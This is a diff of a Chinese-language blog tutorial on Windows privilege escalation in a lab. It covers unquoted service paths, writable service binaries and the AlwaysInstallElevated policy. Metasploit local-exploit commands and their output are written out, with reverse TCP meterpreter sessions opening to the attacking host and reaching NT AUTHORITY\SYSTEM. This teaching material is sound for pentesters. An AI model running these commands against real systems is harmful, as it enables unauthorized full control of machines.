@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.2k 字
+      2.8k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      30
+      38
        分钟
     </span>
   
@@ -229,7 +229,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：October 15, 2021 pm
+                  本文最后更新于：October 16, 2021 pm
                 
               </p>
             
@@ -348,14 +348,14 @@
 
 
 
-<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><h4 id="环境-4"><a href="#环境-4" class="headerlink" title="环境"></a>环境</h4><p>msf Win 10：192.168.199.123</p>
+<h3 id="可信任服务路径提权"><a href="#可信任服务路径提权" class="headerlink" title="可信任服务路径提权"></a>可信任服务路径提权</h3><h4 id="环境-4"><a href="#环境-4" class="headerlink" title="环境"></a>环境</h4><p>msf Win 10：192.168.199.123</p>
 <p>被攻击主机 Windows Server 2008 R2：192.168.199.205</p>
-<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Windows在启动服务对应的二进制文件时，对于该路径中的每一个空格，Windwos都会尝试寻找并执行与空格前面的名字相匹配的程序，例如”C:\Program Files\Unicode.exe”，Windows会依次尝试确定和执行以下程序：</p>
+<h4 id="漏洞原理介绍"><a href="#漏洞原理介绍" class="headerlink" title="漏洞原理介绍"></a>漏洞原理介绍</h4><p>Windows在启动服务对应的二进制文件时，对于该路径中的每一个空格，Windwos都会尝试寻找并执行与空格前面的名字相匹配的程序，例如”C:\Program Files\Unicode.exe”，Windows会依次尝试确定和执行以下程序：</p>
 <ul>
 <li>C:\Program.exe</li>
 <li>C:\Program Files\Unicode.exe</li>
 </ul>
-<h4 id="可信任服务路径漏洞-1"><a href="#可信任服务路径漏洞-1" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><p>创建vulservice服务，对应的二进制执行文件路径为C:\Program Files\Unicode.exe</p>
+<h4 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><p>创建vulservice服务，对应的二进制执行文件路径为C:\Program Files\Unicode.exe</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sc create vulservice binpath= <span class="hljs-string">&quot;C:\Program Files\Unicode.exe&quot;</span> displayname= <span class="hljs-string">&quot;vulservice&quot;</span><br></code></pre></td></tr></table></figure>
 
 
@@ -379,6 +379,36 @@
 
 
 
+<h3 id="系统权限配置提权"><a href="#系统权限配置提权" class="headerlink" title="系统权限配置提权"></a>系统权限配置提权</h3><h4 id="环境-5"><a href="#环境-5" class="headerlink" title="环境"></a>环境</h4><p>msf Win 10：192.168.199.123</p>
+<p>被攻击主机 Windows Server 2008 R2：192.168.199.205</p>
+<h4 id="漏洞原理介绍-1"><a href="#漏洞原理介绍-1" class="headerlink" title="漏洞原理介绍"></a>漏洞原理介绍</h4><p>Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件，<strong>Windows服务是以system权限运行的，因此，当一个低权限用户对此类系统服务调用的可执行文件有写权限，就可以将该文件替换为任意可执行文件，并随着系统服务的启动获得系统权限</strong></p>
+<h4 id="MSF利用"><a href="#MSF利用" class="headerlink" title="MSF利用"></a>MSF利用</h4><p>利用msf中的windows/local/service_permissions模块可以对目标主机进行该漏洞的检测和利用，<strong>设置session即可</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">...  <span class="hljs-comment"># 省略拿到shell的过程</span><br>msf6 &gt; use exploit/windows/<span class="hljs-built_in">local</span>/service_permissions  <span class="hljs-comment"># 使用模块</span><br>msf6 exploit(windows/<span class="hljs-built_in">local</span>/service_permissions) &gt; <span class="hljs-built_in">set</span> session 1  <span class="hljs-comment"># 设置session</span><br>session =&gt; 1<br>msf6 exploit(windows/<span class="hljs-built_in">local</span>/service_permissions) &gt; run  <span class="hljs-comment"># 开始执行</span><br><br>[*] Started reverse TCP handler on 192.168.199.123:4444<br>[-] The registry technique will be skipped because the payload architecture does not match the native system architecture<br>[*] Trying to add a new service...<br>[*] Created service... kcmRdKIfYwk<br>[+] Service should be started! Enjoy your new SYSTEM meterpreter session.<br>[*] Sending stage (175174 bytes) to 192.168.199.205<br>[+] Deleted C:\Users\ADMINI~1\AppData\Local\Temp\rrkfyCNqpk.exe<br>[*] Meterpreter session 2 opened (192.168.199.123:4444 -&gt; 192.168.199.205:49163) at 2021-10-16 21:03:07 +0800<br><br>meterpreter &gt; getuid  <span class="hljs-comment"># 得到系统权限的shell</span><br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
+
+
+
+<img src="/img/Windows提权方式总结/6.gif" srcset="/img/loading.gif" lazyload>
+
+
+
+<h3 id="注册表键AlwaysInstallElevated提权"><a href="#注册表键AlwaysInstallElevated提权" class="headerlink" title="注册表键AlwaysInstallElevated提权"></a>注册表键AlwaysInstallElevated提权</h3><h4 id="环境-6"><a href="#环境-6" class="headerlink" title="环境"></a>环境</h4><p>msf Win 10：192.168.199.123</p>
+<p>被攻击主机 Windows Server 2008 R2：192.168.199.205</p>
+<h4 id="漏洞原理介绍-2"><a href="#漏洞原理介绍-2" class="headerlink" title="漏洞原理介绍"></a>漏洞原理介绍</h4><p>用户开启了Windows Installer特权安装功能，开启该选项，低权限用户在安装.msi文件时会以system权限进行安装</p>
+<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>使用win+r，输入”gpedit.msc”打开组策略编辑器</p>
+<ul>
+<li>计算机配置-管理模板-Windwos组件-Windows Installer-永远以高特权进行安装-选择”已启用”</li>
+<li>用户配置-管理模板-Windwos组件-Windows Installer-永远以高特权进行安装-选择”已启用”</li>
+</ul>
+<img src="/img/Windows提权方式总结/6.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>使用msf的windows/local/always_install_elevated模块进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ use exploit/windows/<span class="hljs-built_in">local</span>/always_install_elevated<br>$ <span class="hljs-built_in">set</span> session 5<br>$ run<br>[*] Started reverse TCP handler on 192.168.199.123:4444<br>[*] Uploading the MSI to C:\Users\ADMINI~1\AppData\Local\Temp\kUYgEIaSx.msi ...<br>[*] Executing MSI...<br>[*] Sending stage (175174 bytes) to 192.168.199.205<br>[+] Deleted C:\Users\ADMINI~1\AppData\Local\Temp\kUYgEIaSx.msi<br>[*] Meterpreter session 8 opened (192.168.199.123:4444 -&gt; 192.168.199.205:49169) at 2021-10-16 21:55:41 +0800<br><br>meterpreter &gt; getuid  <span class="hljs-comment"># system权限</span><br>Server username: NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
+
+
+
+<img src="/img/Windows提权方式总结/7.gif" srcset="/img/loading.gif" lazyload>
 
             </div>
             <hr>
